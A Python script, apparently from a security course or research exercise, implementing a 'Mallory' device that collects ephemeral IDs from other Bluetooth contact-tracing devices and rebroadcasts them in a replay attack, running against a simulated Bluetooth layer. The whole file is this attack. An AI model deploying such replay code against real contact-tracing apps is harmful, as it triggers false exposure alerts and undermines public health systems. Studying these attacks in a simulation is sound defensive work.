
import os
import random
from source import timeframework as time
import time as real_time
import threading
import secrets
import sys
import hmac
import hashlib
from Crypto.Cipher import AES 
from Crypto.Util import Counter
import urllib.request
import source.timeframework
from fake_android import BluetoothLeAdvertiser, BluetoothLeScanner, UdpClient
from source import timeframework

stolen_ids = set()

class Mallory: 
    """ This class represents a malicious device which collects EphIDs from other devices and broadcasts these Ephemerals ID (EphIDs) """
    
    def __init__(self, name, udp_client):
        #an empty set#
        self.udp_client= udp_client
        self.name = name
        
        self.start_broadcast()
        self.start_listen_to_ephids()
       
       
    def start_broadcast(self):
        """starting the broadcast thread"""
        self.broadcast_thread = threading.Thread(target=self.broadcasting_ids_thread)
        self.broadcast_thread.start()
    
 
    def broadcasting_ids_thread(self):
        #send out the EphIDs, every 15 minutes pick a new one. 
        #every two minutes creates a new SK
        
        # Create an advertiser and broadcast the stolen ids
        advertiser = BluetoothLeAdvertiser(self.name, self.udp_client)
        advertiser.start_advertising(1000, b'')
        while True:
            for stolen_id in list(stolen_ids):
                advertiser.start_advertising(200, stolen_id)
                time.task_sleep(60)
    
    def start_listen_to_ephids(self):
        """starting the thread that listen to other devices"""
        bluetooth_scanner = BluetoothLeScanner(self.receive_ephid, self.udp_client)
  
    def receive_ephid(self, ephid):
        stolen_ids.add(ephid)
       
       
argument = sys.argv[1]
if argument.isnumeric():
    #A number was passed in. Start this many clients#
    number_of_clients = int(argument)
    for i in range(0, number_of_clients):
        real_time.sleep(random.uniform(0.05, 0.25))
        client = Mallory(f'Mallory{i}',  UdpClient())
else:
    #A string was passed in. Start one client with this name#
    client = Mallory(argument, UdpClient())
